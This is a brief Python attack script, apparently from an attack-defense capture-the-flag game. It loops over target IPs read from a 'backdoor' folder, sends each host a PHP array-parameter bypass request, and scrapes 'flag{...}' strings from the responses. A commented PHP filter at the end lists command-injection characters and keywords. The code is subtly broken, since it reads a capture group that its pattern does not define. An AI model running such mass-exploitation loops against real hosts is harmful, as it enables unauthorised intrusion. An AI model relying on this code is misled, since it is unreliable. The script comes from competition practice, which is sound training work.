import re
from time import sleep
import requests

ips = [f"192.168.{i}.2" for i in range(177, 251)]
filename = "../后门/ip.txt"
with open(filename, 'r', encoding='utf-8') as f:
    for line in f:
        # line 包含末尾的换行符 \n，使用 strip() 去除首尾空白字符和换行符
        ip = line.strip()
        url = 'http://'+ip +'/?num[]=1'
        print(url)
        r = requests.get(url)  # post执行
        if r.status_code == 200:
            x = r.text
            pattern = r'flag\{[^}]+\}'
            match = re.search(pattern, x)
            if match:
                print("have flag:", match.group(1))
        else:
            print(url," no flag ,status_code :" , r.status_code)
        sleep(0.02)



#'''
#if (!preg_match_all("/(\||&|;| |\/|cat|flag|ctfhub)/", $ip, $m
#'''